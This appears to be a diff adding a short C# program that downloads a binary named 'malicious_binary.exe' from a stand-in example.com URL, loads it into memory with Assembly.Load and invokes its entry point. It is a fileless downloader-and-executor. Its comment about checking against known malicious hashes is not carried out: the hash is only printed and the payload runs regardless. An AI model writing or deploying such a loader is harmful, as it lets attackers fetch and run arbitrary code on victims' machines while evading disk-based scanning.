@@ -1,0 +1,36 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Security.Cryptography;
+
+namespace MemoryExecution
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Load the binary data from an external source into a byte array
+            byte[] binaryData;
+            using (WebClient client = new WebClient())
+            {
+                binaryData = client.DownloadData("http://www.example.com/malicious_binary.exe");
+            }
+
+            // Calculate the hash of the binary data to compare against known malicious hashes
+            byte[] hash = SHA256.Create().ComputeHash(binaryData);
+            Console.WriteLine("Hash of binary data: " + BitConverter.ToString(hash));
+
+            // Create a new instance of the Assembly class and load the binary data into memory
+            Assembly assembly = Assembly.Load(binaryData);
+
+            // Execute the main method of the loaded assembly
+            MethodInfo method = assembly.EntryPoint;
+            if (method != null)
+            {
+                object[] parameters = new object[0];
+                method.Invoke(null, parameters);
+            }
+        }
+    }
+}
